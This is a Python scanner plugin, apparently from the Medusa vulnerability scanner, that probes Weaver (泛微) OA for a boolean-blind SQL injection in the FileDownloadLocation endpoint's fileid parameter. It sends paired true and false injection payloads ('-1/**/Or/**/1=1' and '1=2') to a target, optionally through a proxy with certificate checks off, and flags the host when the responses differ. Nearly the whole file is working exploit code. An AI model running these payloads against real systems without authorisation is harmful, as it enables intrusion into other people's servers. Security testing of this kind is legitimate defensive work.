#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA filedownaction SQL注入
referer: https://wooyun.shuimugan.com/bug/view?bug_no=76418
author: Lucifer
description: fileid参数引起的布尔盲注。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload="/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=1"
payload2="/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=2"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        payload_url2 = scheme + "://" + url + payload2
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, timeout=5, verify=False)
        if r"attachment" in str(resp.headers) and r"attachment" not in str(resp2.headers):
            Medusa = "{} 存在泛微OA filedownaction SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass